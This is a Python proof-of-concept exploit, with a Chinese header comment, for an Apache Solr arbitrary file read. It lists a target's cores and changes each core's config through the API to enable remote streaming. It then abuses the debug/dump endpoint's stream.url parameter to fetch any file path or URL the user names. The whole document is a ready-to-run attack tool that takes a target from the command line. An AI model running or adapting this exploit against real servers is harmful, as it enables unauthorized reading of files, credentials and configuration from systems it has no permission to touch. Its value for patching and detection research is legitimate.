# solr任意文件下载漏洞poc
# __coding=utf-8__
import requests
import json
import argparse

TIMEOUT = 20


def run(target: str, action: str):
    try:
        admin_url = target + "/solr/admin/cores?indexInfo=false&wt=json"
        response = requests.get(admin_url, verify=False, timeout=TIMEOUT)
        if response.status_code == 200 or "name" in response.text:
            data = json.loads(response.content)
            for i in data["status"]:
                key = data["status"][i]["name"]
                return attack(key, target, action)
    except Exception as e:
        error = "[-] {} run error:{}".format(target, str(e))
        raise RuntimeError(error)
    return None


def attack(core_name: str, target: str, action: str):
    session = requests.session()
    config_url = target + "/solr/" + core_name + "/config"
    json_data = {"set-property": {"requestDispatcher.requestParsers.enableRemoteStreaming": "true"}}
    response = session.post(config_url, data=json.dumps(json_data), timeout=TIMEOUT)
    if response and 200 != response.status_code: return None

    dump_url = target + "/solr/" + core_name + "/debug/dump?param=ContentStreams"
    dump_data = {"stream.url": action}
    response = session.post(dump_url, data=dump_data, timeout=TIMEOUT)
    if response is None:
        return None
    elif 200 == response.status_code:
        content = json.loads(response.text)
        return content['streams'][0]['stream']
    elif 500 == response.status_code:
        return response.text
    else:
        return None


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Solr 任意文件下载漏洞POC.')
    parser.add_argument('-u',"--url",
                        help='solr attack target', required=True)
    parser.add_argument('-a', '--action',
                        help='file or url', required=True)
    args = parser.parse_args()
    print("[+] check {} ,action:get {}".format(args.url, args.action))
    result = run(args.url, args.action)
    if result is None: print("[-] Not found vuln")
    print("[+] The result is as follows:\n{}".format(result))